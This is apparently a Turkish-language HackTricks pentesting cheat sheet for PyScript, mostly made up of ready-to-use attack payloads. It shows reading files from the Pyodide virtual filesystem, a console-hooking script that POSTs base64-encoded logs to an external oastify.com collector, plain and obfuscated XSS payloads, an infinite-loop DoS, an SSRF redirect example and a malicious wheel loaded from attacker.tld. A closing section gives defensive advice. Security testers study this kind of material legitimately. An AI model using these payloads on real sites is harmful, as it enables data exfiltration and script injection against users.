# Pyscript

## PyScript Pentesting Rehberi

PyScript, Python'u HTML'e entegre etmek için geliştirilmiş yeni bir framework'tür; böylece HTML ile birlikte kullanılabilir. Bu cheat sheet'te PyScript'i penetration testing amaçlarınız doğrultusunda nasıl kullanacağınızı bulabilirsiniz.

### Emscripten sanal bellek dosya sisteminden dosya dökümü alma / dosyaları geri getirme:

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Sonuç:

![PyScript Pentesting Guide - Emscripten sanal bellek dosya sisteminden dosyaları dökme / alma: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Emscripten sanal bellek dosya sisteminin OOB Data Exfiltration'ı (console monitoring)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPkP5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Sonuç:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinary)

Kod:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Sonuç:

![Emscripten sanal bellek dosya sisteminin OOB Data Exfiltration işlemi (konsol izleme) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Kod:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Sonuç:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Kod:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Sonuç:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Sonsuz döngü)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Sonsuz döngü)

Kod:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Sonuç:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Yeni güvenlik açıkları ve teknikler (2023-2025)

### Server-Side Request Forgery via kontrolsüz yönlendirmeler (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0`, Pyodide'ın browser transport'u ile kullanıldığında `redirect` ve `retries` request parametrelerini göz ardı eder. Bir attacker hedef URL'leri etkileyebiliyorsa kod, urllib3'den bunları devre dışı bırakmasını istese bile cross-domain yönlendirmeleri takip edebilir ve bu durum SSRF savunmalarını zayıflatabilir.<sup>[[1]](#references)[[4]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
"GET",
"https://evil.example/302",
retries=False,
redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
Node.js için `urllib3 >= 2.5.0` sürümüne yükseltin; ancak tarayıcılarda yönlendirmeleri devre dışı bırakmak için urllib3'e güvenmeyin. Bunun yerine istek yapmadan önce hedefleri doğrulayın veya allow-list kullanın.<sup>[[4]](#references)</sup>

### Arbitrary package loading & supply-chain attacks

PyScript'in Pyodide yapılandırması, `packages` içinde rastgele wheel URL'lerini kabul eder; bir saldırgan bu yapılandırmayı değiştirebilir veya buna müdahale edebilirse sonraki bir import, saldırganın kontrolündeki Python kodunu kurbanın tarayıcısında çalıştırabilir.<sup>[[5]](#references)[[6]](#references)</sup>
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide, paketin WebAssembly derlemesi olmadan rastgele URL'lerden pure-Python wheel'lerini yükleyebilir.<sup>[[6]](#references)</sup> Bu yapılandırmayı geliştirici kontrolünde tutun, tam paket adlarını veya URL'leri allow-list'e ekleyin ve uzak wheel özetlerini build veya deployment sırasında doğrulayın.

### Output sanitisation changes (2023+)

* Eski örneklerde kullanılan 2022.05.1 uygulamasında `print()`, HTML escaping uygulamadan `text/plain` çıktısı yazar ve bu nedenle XSS açığına açıktır.<sup>[[8]](#references)</sup>
* Güncel `display()` helper'ı, plain string'ler için varsayılan olarak HTML'i escape eder; raw markup, `pyscript.HTML()` içine sarılmalıdır.<sup>[[2]](#references)</sup>
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
`display()` öğesini güvenilmeyen girdiler için kullanın ve güvenilmeyen dizeleri `HTML()` öğesine aktarmayın.<sup>[[2]](#references)</sup>

---

## Savunma İçin En İyi Uygulamalar

* **Paketleri güncel tutun** – Node.js içinde `urllib3 >= 2.5.0` kullanın ve tarayıcı yönlendirmelerine ilişkin varsayımları ayrıca gözden geçirin.<sup>[[4]](#references)</sup>
* **Paket kaynaklarını kısıtlayın** – PyPI adlarını veya tam güvenilir URL'leri allow-list'e ekleyin ve derleme ya da deployment sırasında uzak wheel özetlerini doğrulayın.<sup>[[5]](#references)[[6]](#references)</sup>
* **Content Security Policy'yi güçlendirin** – enjekte edilen `<script>` bloklarının çalıştırılamaması için satır içi JavaScript'i (`script-src 'self' 'sha256-…'`) engelleyin.
* **Kullanıcı tarafından sağlanan `<py-script>` / `<script type="py">` etiketlerine izin vermeyin** – diğer kullanıcılara geri göndermeden önce HTML'i sunucuda sanitize edin.
* **Worker'ları izole edin** – worker'lardan DOM'a senkron erişime ihtiyacınız yoksa `sync_main_only` flag'ini etkinleştirerek `SharedArrayBuffer` kullanımını ve bununla ilişkili CORS header gereksinimlerini önleyin.<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript yerleşik işlevler dokümantasyonu – `display` ve `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - Güvenlik Açığı Zincirleme Sanatı (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [urllib3 güvenlik duyurusu – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [PyScript yapılandırma dokümantasyonu – paketler ve `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – Paketleri yükleme](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [PyScript 2022.05.1 `pyscript.py` uygulaması](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
